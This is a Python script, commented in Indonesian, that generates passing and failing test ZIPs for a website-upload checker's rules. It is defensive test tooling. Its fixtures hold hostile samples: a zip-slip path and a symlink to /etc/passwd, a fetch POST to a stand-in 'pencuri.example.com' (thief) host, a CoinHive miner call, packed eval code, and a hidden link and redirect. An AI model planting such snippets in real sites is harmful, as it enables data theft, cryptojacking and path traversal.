#!/usr/bin/env python3
"""
Membuat ZIP uji per aturan pengecekan (docs/rancangan/alur-fitur-upload.md bagian 5.10).

Hasil: backend/src/test/resources/test-fixtures/<KODE_ATURAN>/{gagal.zip,lolos.zip}
       backend/src/test/resources/test-fixtures/_DASAR/bersih.zip   (template bersih, tanpa masalah sama sekali)

Jalankan dari folder backend/:
    python3 tools/buat-zip-uji.py

Setiap kasus = template bersih (DASAR) + perubahan kecil. Isi ZIP dibuat sendiri (bukan ZIP asli provider).
Aturan ukuran memakai batas yang diperkecil di test (lihat CheckRuleFixturesTest.testSettings()), agar ZIP uji
tetap kecil di repo.

Aturan baru wajib ditambahkan ke CASES di bawah. ZIP dari laporan "Ini keliru?" yang terbukti salah tuduh
boleh disalin langsung ke folder aturannya dengan nama lolos-<nama>.zip (ikut diuji sebagai kasus lolos).
"""
import os
import random
import shutil
import struct
import zipfile

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src", "test", "resources", "test-fixtures")
FIXED_TIME = (2026, 10, 7, 0, 0, 0)  # tanggal tetap agar ZIP tidak berubah setiap kali dibuat ulang

# PNG 1x1 piksel yang valid.
PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d4948445200000001000000010806000000"
    "1f15c4890000000d49444154789c63f8cfc0f01f0005000201a5d2a1c8"
    "0000000049454e44ae426082")


def noise(size, seed):
    """Byte acak (tidak bisa dikompres), untuk kasus ukuran."""
    return random.Random(seed).randbytes(size)


def page(title="Toko Kue Bu Ani", head_extra="", body=None, doctype=True, lang=True, charset=True,
         viewport=True, scripts='<script src="js/main.js"></script>', nav=None):
    nav = nav if nav is not None else '<a href="index.html">Beranda</a> <a href="tentang.html">Tentang</a>'
    body = body if body is not None else (
        '<section id="hero"><h1>Toko Kue Bu Ani</h1>'
        '<p>Kue rumahan yang dibuat setiap pagi dengan bahan pilihan.</p>'
        '<img src="img/hero.png" alt="Kue cokelat"><a href="#kontak">Pesan sekarang</a></section>\n'
        '<section id="kontak"><h2>Kontak</h2><p>Hubungi kami lewat WhatsApp setiap hari.</p></section>')
    return (("<!DOCTYPE html>\n" if doctype else "")
            + ('<html lang="id">\n' if lang else "<html>\n")
            + "<head>\n"
            + ('<meta charset="utf-8">\n' if charset else "")
            + ('<meta name="viewport" content="width=device-width, initial-scale=1">\n' if viewport else "")
            + (f"<title>{title}</title>\n" if title else "")
            + '<link rel="stylesheet" href="css/style.css">\n'
            + head_extra
            + "</head>\n<body>\n"
            + f"<header><nav>{nav}</nav></header>\n<main>\n{body}\n</main>\n"
            + "<footer><p>Toko Kue Bu Ani, Bandung</p></footer>\n"
            + scripts + "\n</body>\n</html>\n")


TENTANG = page(title="Tentang kami", body='<section id="tentang"><h1>Tentang kami</h1>'
                                          '<p>Kami membuat kue sejak 2010 untuk keluarga di Bandung.</p></section>')

CSS = """:root { --primary: #8b4513; --radius: 8px; }
* { box-sizing: border-box; }
body { margin: 0; font-family: sans-serif; color: #222; }
#hero { padding: 48px 24px; background: url(../img/hero.png) no-repeat; border-radius: var(--radius); }
#hero a { color: var(--primary); }
@media (max-width: 768px) { #hero { padding: 24px 16px; } }
"""

JS = """document.addEventListener('DOMContentLoaded', function () {
  var hero = document.querySelector('#hero');
  if (hero) { hero.classList.add('siap'); }
});
"""

DASAR = {
    "index.html": page(),
    "tentang.html": TENTANG,
    "css/style.css": CSS,
    "js/main.js": JS,
    "img/hero.png": PNG,
}


def site(changes=None, wrap=None):
    files = dict(DASAR)
    for path, content in (changes or {}).items():
        if content is None:
            files.pop(path, None)
        else:
            files[path] = content
    if wrap:
        files = {wrap + p: c for p, c in files.items()}
    return files


def with_body(extra, **kw):
    """index.html dasar + potongan HTML tambahan di dalam <main>."""
    base = ('<section id="hero"><h1>Toko Kue Bu Ani</h1>'
            '<p>Kue rumahan yang dibuat setiap pagi dengan bahan pilihan.</p>'
            '<img src="img/hero.png" alt="Kue cokelat"><a href="#kontak">Pesan sekarang</a></section>\n'
            '<section id="kontak"><h2>Kontak</h2><p>Hubungi kami lewat WhatsApp setiap hari.</p></section>\n')
    return page(body=base + extra, **kw)


def with_js(code):
    return site({"js/main.js": JS + code})


# ---------- ZIP khusus yang tidak bisa dibuat dari folder biasa ----------

def write_zip(path, files, entries_extra=None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for name, content in files.items():
            info = zipfile.ZipInfo(name, FIXED_TIME)
            info.compress_type = zipfile.ZIP_DEFLATED
            z.writestr(info, content.encode("utf-8") if isinstance(content, str) else content)
        for info, content in (entries_extra or []):
            z.writestr(info, content)


def encrypted_zip(path):
    """ZIP dengan bit "dikunci password" menyala (cukup untuk menguji deteksi)."""
    write_zip(path, site())
    data = bytearray(open(path, "rb").read())
    pos = 0
    while True:
        pos = data.find(b"PK\x01\x02", pos)
        if pos < 0:
            break
        flags = struct.unpack_from("<H", data, pos + 8)[0]
        struct.pack_into("<H", data, pos + 8, flags | 1)
        pos += 4
    open(path, "wb").write(bytes(data))


def symlink_info(name):
    info = zipfile.ZipInfo(name, FIXED_TIME)
    info.create_system = 3  # Unix
    info.external_attr = (0o120777 << 16)
    return info


CASES = {
    # A. ZIP dan struktur
    "ZIP_INVALID": (b"ini bukan file zip", site()),
    "ZIP_ENCRYPTED": ("encrypted", site()),
    "NO_INDEX": (site({"index.html": None, "home.html": page()}), site(wrap="toko-kue/")),
    "ZIP_TOO_LARGE": (site({"img/foto.jpg": noise(260 * 1024, 1)}), site()),
    "EXTRACTED_TOO_LARGE": (site({f"data/isi-{i}.txt": "0" * (90 * 1024) for i in range(5)}), site()),
    "TOO_MANY_FILES": (site({f"img/ikon-{i}.png": PNG for i in range(40)}),
                       site({f"img/ikon-{i}.png": PNG for i in range(20)})),
    "UNSAFE_PATH": ("unsafe", site({"assets/img/logo.png": PNG})),
    "TOO_MANY_PAGES": (
        site({"index.html": page(nav=" ".join(f'<a href="hal-{i}.html">Hal {i}</a>' for i in range(10))),
              **{f"hal-{i}.html": TENTANG for i in range(10)}, "tentang.html": None}),
        site({"index.html": page(nav=" ".join(f'<a href="hal-{i}.html">Hal {i}</a>' for i in range(9))),
              **{f"hal-{i}.html": TENTANG for i in range(9)}, "tentang.html": None})),
    "SOURCE_NOT_BUILT": (
        site({"package.json": '{"name":"toko-kue","scripts":{"build":"vite build"}}',
              "vite.config.js": "export default {}",
              "src/main.ts": "import { createApp } from 'vue'\ncreateApp({}).mount('#app')\n",
              "index.html": page(scripts='<script type="module" src="/src/main.ts"></script>')}),
        site({"package.json": '{"name":"toko-kue"}', "vite.config.js": "export default { base: './' }",
              "assets/index-a1b2c3.js": JS,
              "index.html": page(scripts='<script type="module" src="assets/index-a1b2c3.js"></script>')})),
    "UNBUILT_RESOURCE": (
        site({"css/style.scss": "$warna: #8b4513;\nbody { color: $warna; }",
              "index.html": with_body('<include src="partials/header.html"></include>')}),
        site({"README.md": "# Toko Kue"})),
    "CASE_MISMATCH": (site({"index.html": page().replace("img/hero.png", "img/Hero.png")}), site()),
    "FILE_NAME_STYLE": (site({"img/foto produk (1).png": PNG,
                              "index.html": with_body('<img src="img/foto%20produk%20(1).png" alt="Produk">')}),
                        site({"img/foto-produk-1.png": PNG,
                              "index.html": with_body('<img src="img/foto-produk-1.png" alt="Produk">')})),
    # B. Jenis file
    "FILE_TYPE_NOT_ALLOWED": (site({"video/promo.mp4": noise(2048, 2)}),
                              site({"fonts/inter.woff2": noise(1024, 3), "data/menu.json": '{"menu":[]}'})),
    "SERVER_SCRIPT": (site({"kontak.php": "<?php echo 'halo'; ?>"}), site()),
    # C. HTML
    "HTML_UNREADABLE": (site({"tentang.html": "   \n"}), site()),
    "JS_RENDERED_CONTENT": (site({"index.html": page(body='<div id="root"></div>')}), site()),
    "JS_PARTIAL_CONTENT": (
        site({"index.html": with_body('<div x-data="{ judul: \'Promo\' }"><h2 x-text="judul"></h2></div>')}),
        site({"index.html": with_body('<div x-data="{ buka: false }"><button @click="buka = !buka">Menu</button>'
                                      '<h2>Promo minggu ini</h2></div>')})),
    "FORM_EXTERNAL_ACTION": (
        site({"index.html": with_body('<form action="https://pengumpul.example.com/kirim" method="post">'
                                      '<input name="nama"><button>Kirim</button></form>')}),
        site({"index.html": with_body('<a href="https://wa.me/6281234567890">Pesan via WhatsApp</a>'
                                      '<a href="mailto:halo@tokokue.test">Email</a>')})),
    "AUTO_REDIRECT": (
        site({"index.html": page(head_extra='<meta http-equiv="refresh" content="0; url=https://situs-lain.example.com">\n')}),
        with_js("document.querySelector('#hero a').addEventListener('click', function () {\n"
                "  location.href = 'https://wa.me/6281234567890';\n});\n")),
    "NO_VIEWPORT": (site({"index.html": page(viewport=False)}), site()),
    "NO_TITLE": (site({"index.html": page(title=None)}), site()),
    "IMG_NO_ALT": (site({"index.html": with_body('<img src="img/hero.png">')}),
                   site({"index.html": with_body('<img src="img/hero.png" alt="">')})),
    "COMPONENT_FRAMEWORK": (
        site({"index.html": page(scripts='<script id="__NEXT_DATA__" type="application/json">{"props":{}}</script>')}),
        site({"index.html": with_body('<div id="next-section"><p>Bagian berikutnya</p></div>')})),
    "TOO_FEW_EDITABLE": (
        site({"index.html": page(body="<h1>Halo</h1>", nav="", scripts=""), "tentang.html": None}),
        site()),
    "RESERVED_ATTRIBUTE": (site({"index.html": with_body('<h2 data-key="judul">Promo</h2>')}),
                           site({"index.html": with_body('<section data-section="Promo"><h2>Promo</h2></section>')})),
    "BASE_HREF": (site({"index.html": page(head_extra='<base href="https://situs-lain.example.com/">\n')}), site()),
    "PLUGIN_TAG": (site({"index.html": with_body('<embed src="img/hero.png">')}),
                   site({"index.html": with_body('<iframe src="https://www.youtube.com/embed/abc123" title="Video"></iframe>')})),
    "CHARSET": (site({"index.html": page(charset=False)}), site()),
    "DOCTYPE_LANG": (site({"index.html": page(doctype=False)}), site()),
    "DUPLICATE_ID": (site({"index.html": with_body('<div id="hero"><p>Duplikat</p></div>')}), site()),
    "BASE64_IMAGE": (
        site({"index.html": with_body('<img alt="Logo" src="data:image/png;base64,' + "A" * 4000 + '">')}),
        site({"index.html": with_body('<img alt="Ikon" src="data:image/svg+xml;base64,PHN2Zy8+">')})),
    # D. File yang dirujuk
    "MISSING_ASSET": (site({"index.html": page(scripts='<script src="js/tidak-ada.js"></script>')}), site()),
    "MISSING_IMAGE": (site({"index.html": with_body('<img src="img/hilang.png" alt="Hilang">')}), site()),
    "BROKEN_PAGE_LINK": (site({"index.html": with_body('<a href="kontak.html">Kontak</a>')}), site()),
    "BROKEN_ANCHOR": (site({"index.html": with_body('<a href="#tidak-ada">Lompat</a>')}),
                      site({"index.html": with_body('<a href="tentang.html#tentang">Tentang</a><a href="#top">Atas</a>')})),
    "ORPHAN_PAGE": (site({"galeri.html": TENTANG}),
                    site({"galeri.html": TENTANG, "index.html": with_body('<a href="galeri.html">Galeri</a>')})),
    "HOTLINK_IMAGE": (site({"index.html": with_body('<img src="https://gambar.example.com/kue.jpg" alt="Kue">')}), site()),
    "ROOT_ABSOLUTE_PATH": (site({"index.html": page().replace('href="css/style.css"', 'href="/css/style.css"')}), site()),
    # C2. CSS
    "CSS_MISSING_URL": (site({"css/style.css": CSS + "footer { background: url('../img/latar.png'); }\n"}), site()),
    "CSS_SYNTAX": (site({"css/style.css": CSS + "footer { color: red;\n"}), site()),
    "CSS_SCRIPT_TRICK": (site({"css/style.css": CSS + "footer { width: expression(document.body.clientWidth); }\n"}),
                         site({"css/style.css": CSS + "html { scroll-behavior: smooth; }\n"})),
    "NOT_RESPONSIVE": (
        site({"css/style.css": "body { margin: 0; font-family: sans-serif; }\n"}),
        site({"css/style.css": "body { margin: 0; }\n",
              "index.html": page(head_extra='<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">\n')})),
    "CSS_TOO_LARGE": (site({"css/style.css": CSS + "/* isi */\n" + ".kelas { color: red; }\n" * 1400}), site()),
    # E. Library dan sumber dari luar
    "CDN_NOT_ALLOWED": (
        site({"index.html": page(scripts='<script src="https://cdn.jsdelivr.net/npm/xyz-slider@1.0.0/dist/xyz.min.js"></script>')}),
        site({"index.html": page(scripts='<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.14.1/dist/cdn.min.js"></script>')})),
    "CDN_VERSION_UNCLEAR": (
        site({"index.html": page(scripts='<script src="https://unpkg.com/alpinejs@latest/dist/cdn.min.js"></script>')}),
        site({"index.html": page(scripts='<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>')})),
    "UNTRUSTED_SOURCE": (site({"index.html": page(scripts='<script src="https://lib.example.com/slider.js"></script>')}),
                         site({"index.html": page(scripts='<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>')})),
    "TAILWIND_PLAY_CDN": (site({"index.html": page(head_extra='<script src="https://cdn.tailwindcss.com"></script>\n')}), site()),
    "GOOGLE_FONTS": (
        site({"index.html": page(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter&display=swap">\n')}),
        site({"fonts/inter.woff2": noise(1024, 4),
              "css/style.css": CSS + "@font-face { font-family: Inter; src: url(../fonts/inter.woff2) format('woff2'); }\n"})),
    "JS_CDN_IMPORT": (
        site({"js/main.js": "import confetti from 'https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/+esm';\nconfetti();\n",
              "index.html": page(scripts='<script type="module" src="js/main.js"></script>')}),
        site({"js/main.js": "import { mulai } from './util.js';\nmulai();\n",
              "js/util.js": "export function mulai() { document.body.classList.add('siap'); }\n",
              "index.html": page(scripts='<script type="module" src="js/main.js"></script>')})),
    "TRACKER": (
        site({"index.html": page(scripts='<script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXX"></script>\n'
                                         "<script>window.dataLayer = []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date());</script>")}),
        site()),
    "REMOTE_DATA_SDK": (
        site({"index.html": page(scripts='<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>')}),
        site()),
    "IFRAME_NOT_ALLOWED": (
        site({"index.html": with_body('<iframe src="https://widget.example.com/chat" title="Chat"></iframe>')}),
        site({"index.html": with_body('<iframe src="https://www.google.com/maps/embed?pb=abc" title="Peta"></iframe>')})),
    # F. JavaScript
    "EXT_FETCH": (with_js("fetch('https://pencuri.example.com/kirim', { method: 'POST' });\n"),
                  site({"js/main.js": JS + "fetch('data/menu.json').then(function (r) { return r.json(); });\n",
                        "data/menu.json": '{"menu":["Brownies","Bolu"]}'})),
    "JS_EVAL": (with_js("var hasil = eval('1 + 1');\n"),
                with_js("function evaluate(x) { return x * 2; }\nevaluate(2);\n")),
    "HIDDEN_EXTERNAL_LINK": (
        site({"index.html": with_body('<a href="https://titipan.example.com" style="display:none">titipan</a>')}),
        site({"index.html": with_body('<div class="menu-hp" style="display:none">'
                                      '<a href="https://instagram.com/tokokue">Instagram</a></div>')})),
    "SERVICE_WORKER": (with_js("navigator.serviceWorker.register('sw.js');\n"), site()),
    "OBFUSCATED_JS": (
        with_js("eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0 1',2,2,'var|x'.split('|'),0,{}))\n"),
        with_js("!function(){var a=document.querySelector('#hero');a&&a.classList.add('ok')}();\n")),
    "CRYPTO_MINER": (with_js("var miner = new CoinHive.Anonymous('kunci');\nminer.start();\n"), site()),
    "STRING_TIMER": (with_js("setTimeout(\"mulai()\", 1000);\n"), with_js("setTimeout(function () {}, 1000);\n")),
    "DOCUMENT_WRITE": (with_js("document.write('<p>halo</p>');\n"), site()),
    "POPUP_ON_LOAD": (with_js("alert('Selamat datang!');\n"),
                      with_js("function showAlert(pesan) { console.log(pesan); }\nshowAlert('ok');\n")),
    "JS_SYNTAX": (with_js("function rusak() {\n  if (true) {\n    console.log('x');\n}\n"),
                  with_js("var pola = /[{(]/g;\nvar nama = 'Bu Ani';\nvar teks = `Halo ${nama} {`;\n"
                          "var bagi = 10 / 2 / 1;\n")),
    # G. Ukuran dan performa
    "FILE_TOO_LARGE": (site({"data/besar.txt": "0" * (150 * 1024)}), site()),
    "IMAGE_TOO_LARGE": (site({"img/hero.png": noise(30 * 1024, 5)}), site({"img/hero.png": noise(10 * 1024, 6)})),
    "PAGE_TOO_HEAVY": (
        site({**{f"img/foto-{i}.webp": noise(19 * 1024, 10 + i) for i in range(4)},
              "index.html": with_body("".join(f'<img src="img/foto-{i}.webp" alt="Foto {i}">' for i in range(4)))}),
        site({"img/foto-0.webp": noise(19 * 1024, 20),
              "index.html": with_body('<img src="img/foto-0.webp" alt="Foto">')})),
}


def build(path, spec):
    if isinstance(spec, bytes):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, "wb").write(spec)
    elif spec == "encrypted":
        encrypted_zip(path)
    elif spec == "unsafe":
        write_zip(path, site(), [(zipfile.ZipInfo("../keluar.txt", FIXED_TIME), b"zip slip"),
                                 (symlink_info("img/pintasan.png"), b"/etc/passwd")])
    else:
        write_zip(path, spec)


def main():
    if os.path.isdir(ROOT):
        # Simpan ZIP "lolos-*.zip" dari laporan keliru; selebihnya dibuat ulang.
        for folder in os.listdir(ROOT):
            for name in ("gagal.zip", "lolos.zip", "bersih.zip"):
                target = os.path.join(ROOT, folder, name)
                if os.path.exists(target):
                    os.remove(target)
    build(os.path.join(ROOT, "_DASAR", "bersih.zip"), site())
    for code, (fail, ok) in CASES.items():
        build(os.path.join(ROOT, code, "gagal.zip"), fail)
        build(os.path.join(ROOT, code, "lolos.zip"), ok)
    for folder in os.listdir(ROOT):
        if os.path.isdir(os.path.join(ROOT, folder)) and not os.listdir(os.path.join(ROOT, folder)):
            shutil.rmtree(os.path.join(ROOT, folder))
    print(f"{len(CASES)} aturan, {2 * len(CASES) + 1} ZIP uji ditulis ke {os.path.normpath(ROOT)}")


if __name__ == "__main__":
    main()
